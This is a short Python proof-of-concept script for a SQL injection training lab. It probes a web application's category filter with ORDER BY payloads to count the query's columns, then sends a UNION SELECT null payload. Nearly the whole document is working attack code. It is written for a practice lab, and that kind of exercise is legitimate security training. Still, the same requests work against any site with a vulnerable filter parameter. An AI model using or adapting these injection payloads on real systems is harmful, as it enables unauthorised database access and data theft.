# This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. The first step of such an attack is to determine the number of columns that are being returned by the query. You will then use this technique in subsequent labs to construct the full attack.
# To solve the lab, determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.
# PoC Script Credit to SamH


import requests
import sys
from urllib.parse import urlparse

def parse_url(raw_url):
    return urlparse(raw_url).scheme + "://" + urlparse(raw_url).netloc

def calculate_columns(url):
    print("[*] Calculating columns...")
    for i in range(1, 30):
        payload = '\' ORDER BY ' + str(i) + '--'
        params = {
            'category': 'Accessories' + payload
        }
        response = requests.get(url, params=params)
        print("Column number : " + str(i) + " , Response status code : " + str(response.status_code))
        if response.status_code == 500:
            print("column number : " + str(i-1))
            return i-1
            exit(1)

def sqli_null_attack(url, col_num):
    null_query = "null," * col_num
    null_query = null_query.rstrip(',')
    payload = f"\' UNION SELECT {null_query}--"
    print(payload)

    params = {
        'category': 'Accessories' + payload
    }
    
    # Exploit
    response = requests.get(url, params=params, allow_redirects=False)
    print("[+] The payload send, please check the response.")
    # print(response.status_code, response.headers)

if __name__ == "__main__":
    args = sys.argv[1:]

    try:
        raw_url = args[0]
        base_url = parse_url(raw_url)

        # Exploit
        vuln_url = base_url + '/filter'
        
        # Determining how many database culomns - order by method
        sqli_null_attack(vuln_url, calculate_columns(vuln_url))

        

    except IndexError:
        print("[!] Error\nUsage: python3 poc.py <lab_url>")
